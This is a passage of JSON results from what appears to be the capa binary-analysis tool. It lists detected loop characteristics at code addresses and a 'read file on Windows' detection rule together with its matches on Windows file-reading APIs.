                      "value": 6442650266
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442651916
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442651916
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442652812
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442652812
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442653025
                    },
                    {
                      "type": "absolute",
                      "value": 6442653417
                    },
                    {
                      "type": "absolute",
                      "value": 6442653385
                    },
                    {
                      "type": "absolute",
                      "value": 6442653515
                    },
                    {
                      "type": "absolute",
                      "value": 6442653075
                    },
                    {
                      "type": "absolute",
                      "value": 6442653303
                    },
                    {
                      "type": "absolute",
                      "value": 6442653112
                    },
                    {
                      "type": "absolute",
                      "value": 6442653274
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442654236
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442654574
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442656304
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442656304
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442656560
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442656560
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442656694
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442658332
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442658332
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442658672
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442658672
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442659060
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442659060
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442659476
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442659476
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442659928
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442659928
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442665048
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442665048
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442667272
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442667272
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442667748
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442667748
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442667920
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442668476
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442647183
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442669068
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442669068
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442671932
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442671932
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442671984
                    },
                    {
                      "type": "absolute",
                      "value": 6442672109
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442672244
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442672244
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442672480
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442672480
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442672944
                    },
                    {
                      "type": "absolute",
                      "value": 6442673648
                    },
                    {
                      "type": "absolute",
                      "value": 6442673248
                    },
                    {
                      "type": "absolute",
                      "value": 6442674096
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442674144
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442674144
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442674336
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442674640
                    },
                    {
                      "type": "absolute",
                      "value": 6442675088
                    },
                    {
                      "type": "absolute",
                      "value": 6442674832
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442680416
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442515657
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442680864
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442515657
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ]
        ]
      },
      "read file on Windows": {
        "meta": {
          "name": "read file on Windows",
          "namespace": "host-interaction/file-system/read",
          "authors": [
            "moritz.raabe@mandiant.com",
            "anushka.virgaonkar@mandiant.com"
          ],
          "scopes": {
            "static": "function",
            "dynamic": "span of calls"
          },
          "attack": [],
          "mbc": [
            {
              "parts": [
                "File System",
                "Read File"
              ],
              "objective": "File System",
              "behavior": "Read File",
              "method": "",
              "id": "C0051"
            }
          ],
          "references": [],
          "examples": [
            "BFB9B5391A13D0AFD787E87AB90F14F5:0x1314567B"
          ],
          "description": "",
          "lib": false,
          "is_subscope_rule": false,
          "maec": {}
        },
        "source": "rule:\r\n  meta:\r\n    name: read file on Windows\r\n    namespace: host-interaction/file-system/read\r\n    authors:\r\n      - moritz.raabe@mandiant.com\r\n      - anushka.virgaonkar@mandiant.com\r\n    scopes:\r\n      static: function\r\n      dynamic: span of calls\r\n    mbc:\r\n      - File System::Read File [C0051]\r\n    examples:\r\n      - BFB9B5391A13D0AFD787E87AB90F14F5:0x1314567B\r\n  features:\r\n    - or:\r\n      - and:\r\n        - os: windows\r\n        - optional:\r\n          - and:\r\n            - number: 0x80000000 = GENERIC_READ\r\n            - match: create or open file\r\n        - or:\r\n          - api: kernel32.ReadFile\r\n          - api: ReadFileEx\r\n          - api: NtReadFile\r\n          - api: ZwReadFile\r\n          - api: LZRead\r\n          - api: _read\r\n          - api: fread\r\n      - api: System.IO.File::ReadAllBytes\r\n      - api: System.IO.File::ReadAllBytesAsync\r\n      - api: System.IO.File::ReadAllLines\r\n      - api: System.IO.File::ReadAllLinesAsync\r\n      - api: System.IO.File::ReadAllText\r\n      - api: System.IO.File::ReadAllTextAsync\r\n      - api: System.IO.File::ReadLines\r\n",
        "matches": [
          [
            {
              "type": "absolute",
              "value": 6442458992
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::ReadAllBytes"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::ReadAllBytesAsync"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::ReadAllLines"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::ReadAllLinesAsync"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::ReadAllText"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::ReadAllTextAsync"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::ReadLines"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "os",
                          "os": "windows"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "no address"
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "optional"
                        }
                      },
                      "children": [
                        {
                          "success": false,
                          "node": {
                            "type": "statement",
                            "statement": {
                              "type": "and"
                            }
                          },
                          "children": [
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "number",
                                  "number": 2147483648,
                                  "description": "GENERIC_READ"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "match",
                                  "match": "create or open file"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            }
                          ],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": true,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "ReadFile"
                            }
                          },
                          "children": [],
                          "locations": [
                            {
                              "type": "absolute",
                              "value": 6442459465
                            },
                            {
                              "type": "absolute",
                              "value": 6442459074
                            }
                          ],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "ReadFileEx"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "NtReadFile"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "ZwReadFile"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "LZRead"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "_read"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "fread"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442472688
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::ReadAllBytes"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::ReadAllBytesAsync"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::ReadAllLines"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::ReadAllLinesAsync"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::ReadAllText"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::ReadAllTextAsync"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::ReadLines"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "os",
                          "os": "windows"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "no address"
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "optional"
                        }
                      },
                      "children": [
                        {
                          "success": false,
                          "node": {
                            "type": "statement",
                            "statement": {
                              "type": "and"
                            }
                          },
                          "children": [
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "number",
                                  "number": 2147483648,
                                  "description": "GENERIC_READ"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "match",
                                  "match": "create or open file"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            }
                          ],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
